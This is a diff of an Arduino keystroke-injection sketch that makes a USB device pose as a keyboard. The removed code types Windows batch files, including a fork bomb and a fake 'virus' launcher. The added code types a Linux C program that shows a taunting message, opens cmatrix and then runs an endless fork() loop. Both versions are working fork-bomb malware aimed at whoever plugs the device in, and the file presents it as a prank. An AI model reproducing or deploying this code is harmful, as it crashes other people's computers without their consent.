@@ -15,125 +15,43 @@ void setup() {
   Keyboard.begin();
   delay(1000);
 
-  // open command promt with run dialogue
+  // open a terminal
   Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
+  Keyboard.press('t');
   Keyboard.releaseAll();
-  delay(100);
-  Keyboard.print("cmd");
-  Keyboard.press(KEY_RETURN);
-  delay(1);
-  Keyboard.releaseAll();
+  delay(1000);
 
-  delay(100);
-
-  // create new empty files
-  Keyboard.print("copy /Y NUL begin.bat");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  // create new empty files
-  Keyboard.print("copy /Y NUL matrix.bat");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  Keyboard.print("copy /Y NUL bomb.bat");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  Keyboard.print("copy /Y NUL beetle_virus.bat");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
+  // create c virus file
+  Keyboard.print("nano bomb.c");
+  Keyboard.write(KEY_RETURN);
   delay(100);
 
-//  // open begin file for editing
-//  Keyboard.print("notepad begin.bat");
-//  Keyboard.press(KEY_RETURN);
-//  Keyboard.releaseAll();
-//  delay(100);
-//  // enter file contents here
-//  Keyboard.print(":restart\nstart /wait beetle_virus\ngoto restart");
-//  // save  file
-//  Keyboard.press(KEY_LEFT_CTRL);
-//  Keyboard.press('s');
-//  delay(1);
-//  Keyboard.releaseAll();
-//  delay(100);
-//  // close file
-//  Keyboard.press(KEY_LEFT_ALT);
-//  Keyboard.press(KEY_F4);
-//  delay(1);
-//  Keyboard.releaseAll();
-//  delay(100);
+  // enter contents of file
+  Keyboard.print("\\include <unistd.h>\n\\include <stdio.h>\n\nint main(void)\n{");
+  Keyboard.print("\tprintf(@# \bnHello!!@);\n\tsleep(2);\n\t");
+  Keyboard.print("printf(@\n\nYou probably shouldnt have plugged that in...@);");
+  Keyboard.print("\n\tsleep(2);\n\tsystem(@x-terminal-emulator -e cmatrix &@);");
+  Keyboard.print("\n\tsleep(2);\n\tprintf(@\n\nrunning virus...\n\n@);\n\twhile(1) fork();\n}");
 
-  // open matrix file for editing
-  Keyboard.print("notepad matrix.bat");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(100);
-  // enter file contents here
-  Keyboard.print("\"echo off\ncolor 0a\n:x\necho %random% %random% %random% %random% %random% %random% %random% ");
-  Keyboard.print("%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% ");
-  Keyboard.print("%random% %random% %random% %random% %random% %random% %random% %random% %random% %random%\ngoto :x");
-  // save  file
+
+  // save and close
   Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press('s');
-  delay(1);
+  Keyboard.press('x');
   Keyboard.releaseAll();
   delay(100);
-  // close file
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(KEY_F4);
-  delay(1);
-  Keyboard.releaseAll();
+  Keyboard.write('y');
+  delay(100);
+  Keyboard.write(KEY_RETURN);
   delay(100);
 
-  // open bomb file for editing
-  Keyboard.print("notepad bomb.bat");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(100);
-  // enter file contents here
-  Keyboard.print(":fork\nstart %0\ngoto :fork");
-  // save  file
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press('s');
-  delay(1);
-  Keyboard.releaseAll();
-  delay(100);
-  // close file
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(KEY_F4);
-  delay(1);
-  Keyboard.releaseAll();
-  delay(100);
+  // build file
+  //Keyboard.print("make bomb");
+  Keyboard.write(KEY_RETURN);
 
-  // open virus file for editing
-  Keyboard.print("notepad beetle_virus.bat");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(100);
-  // enter file contents here
-  Keyboard.print("\"echo off\necho Hello!!\nPING 1.1.1.1 -n 1 -w 2000 >NUL\necho.\n");
-  Keyboard.print("echo You probably shouldn't have plugged that in...\nPING 1.1.1.1 -n 1 -w 2000 >NUL\necho.\n");
-  Keyboard.print("TIMEOUT /T 10\nstart /max matrix\nPING 1.1.1.1 -n 1 -w 10000 >NUL\necho Starting virus...\n");
-  Keyboard.print("TIMEOUT /T 10\nstart bomb");
-  // save  file
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press('s');
-  delay(1);
-  Keyboard.releaseAll();
-  delay(100);
-  // close file
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(KEY_F4);
-  delay(1);
-  Keyboard.releaseAll();
-  delay(100);
+  //run file
+  Keyboard.print("./bomb");
+  //Keyboard.write(KEY_RETURN);
 
-  // run virus file
-  //Keyboard.print("start begin");
-  Keyboard.print("start beetle_virus");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();    
-  
   Keyboard.end();  
 }
 
